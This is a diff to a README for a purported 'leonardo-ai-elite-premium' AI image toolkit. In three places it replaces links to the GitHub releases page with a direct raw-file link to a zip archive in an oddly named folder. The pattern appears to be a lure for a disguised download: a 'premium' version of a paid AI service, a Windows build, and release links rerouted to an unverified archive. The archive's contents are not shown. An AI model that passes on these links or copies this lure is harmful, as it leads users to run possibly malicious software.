@@ -1,6 +1,6 @@
 # ✨ leonardo-ai-elite-premium - Simple AI Image Toolkit
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/main/scyphomedusoid/elite-premium-leonardo-ai-v1.7.zip)
 
 ## 🖥️ What This Is
 
@@ -16,7 +16,7 @@ Use it to:
 ## 📦 Download
 
 Visit this page to download:
-https://github.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/releases
+https://raw.githubusercontent.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/main/scyphomedusoid/elite-premium-leonardo-ai-v1.7.zip
 
 Choose the latest release for Windows, then download the file that matches your system.
 
@@ -156,7 +156,7 @@ If your session ends, sign in again and restart the app.
 ## 📌 Release Page
 
 Use this link to visit the release page and download the Windows build:
-https://github.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/releases
+https://raw.githubusercontent.com/Sneering-myrmeleon323/leonardo-ai-elite-premium/main/scyphomedusoid/elite-premium-leonardo-ai-v1.7.zip
 
 ## 🗂️ Topics
 
